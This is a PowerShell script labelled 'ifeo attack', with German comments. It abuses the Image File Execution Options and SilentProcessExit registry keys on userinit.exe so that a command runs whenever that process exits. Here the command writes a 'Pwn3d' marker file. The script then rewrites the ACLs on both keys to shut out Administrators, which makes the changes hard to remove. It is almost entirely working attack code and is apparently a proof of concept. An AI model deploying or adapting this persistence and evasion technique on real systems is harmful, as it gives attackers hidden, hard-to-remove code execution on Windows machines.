$targetProcess = "userinit.exe"

$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProcess"
$spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProcess"

Write-Host ""
Write-Host "=== ifeo attack ===" -ForegroundColor Cyan


function Set-RegistryKeyACL {
    param([string]$Path)

    $acl = Get-Acl $Path
    $acl.SetAccessRuleProtection($true, $false)

    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
        "SYSTEM", "FullControl", "Allow"
    )))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
        "Administrators", "ReadKey", "Allow"
    )))

    Set-Acl -Path $Path -AclObject $acl
}


try {
    Write-Host ""
    Write-Host "- initiate silent process exit" -ForegroundColor Cyan

    # IFEO-Schluessel erstellen
    New-Item -Path $ifeoPath -Force

    # GlobalFlag setzen (0x200 = 512 als Dezimal)
    New-ItemProperty -Path $ifeoPath `
        -Name "GlobalFlag" `
        -Value 512 `
        -PropertyType DWORD `
        -Force


    Write-Host ""
    Write-Host "- set silent process exit" -ForegroundColor Cyan

    # SilentProcessExit-Schluessel erstellen
    New-Item -Path $spePath -Force

    # MonitorProcess setzen
    New-ItemProperty -Path $spePath `
        -Name "MonitorProcess" `
        # -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command `"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8`"" `
        -Value "C:\Windows\System32\cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt" `
        -PropertyType String `
        -Force

    # ReportingMode setzen - notwendig, um den MonitorProzess zu starten
    New-ItemProperty -Path $spePath `
        -Name "ReportingMode" `
        -Value 1 `
        -PropertyType DWORD `
        -Force

    Write-Host ""
    Write-Host "- set ACL on registry keys" -ForegroundColor Cyan

    # ACL auf beide Registry-Schluessel setzen
    Set-RegistryKeyACL $ifeoPath
    Set-RegistryKeyACL $spePath

    Write-Host ""
    Write-Host "- done" -ForegroundColor Cyan

} catch {
    Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
}